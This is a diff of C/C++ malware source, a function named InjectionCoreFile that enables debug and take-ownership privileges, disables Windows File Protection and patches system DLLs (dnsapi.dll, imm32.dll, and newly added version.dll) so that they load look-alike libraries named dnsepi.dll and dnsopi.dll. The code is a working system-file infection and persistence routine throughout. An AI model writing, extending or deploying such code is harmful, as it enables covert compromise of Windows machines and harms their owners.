@@ -119,12 +119,7 @@ void InjectionCoreFile() {
 	EnablePrivilege(SE_DEBUG_NAME, TRUE);
 	EnablePrivilege(SE_TAKE_OWNERSHIP_NAME, TRUE);
 
-	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\dnsapi.dll"), szTargetPath, MAX_PATH)) {
-		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\dnsapi.dll"));
-	}
-
-	DisableWFP(szTargetPath);
-	AddDllToFile("dnsepi.dll", szTargetPath, FALSE);
+	//////////////////////////////////////////////////////////////////////////
 
 	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\imm32.dll"), szTargetPath, MAX_PATH)) {
 		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\imm32.dll"));
@@ -132,6 +127,22 @@ void InjectionCoreFile() {
 
 	DisableWFP(szTargetPath);
 	AddDllToFile("dnsopi.dll", szTargetPath, FALSE);
+
+	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\version.dll"), szTargetPath, MAX_PATH)) {
+		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\version.dll"));
+	}
+
+	DisableWFP(szTargetPath);
+	AddDllToFile("dnsopi.dll", szTargetPath, FALSE);
+
+	//////////////////////////////////////////////////////////////////////////
+
+	if (0 == ExpandEnvironmentStrings(_T("%WINDIR%\\System32\\dnsapi.dll"), szTargetPath, MAX_PATH)) {
+		_tcscpy(szTargetPath, _T("C:\\Windows\\System32\\dnsapi.dll"));
+	}
+
+	DisableWFP(szTargetPath);
+	AddDllToFile("dnsepi.dll", szTargetPath, FALSE);
 
 }
 
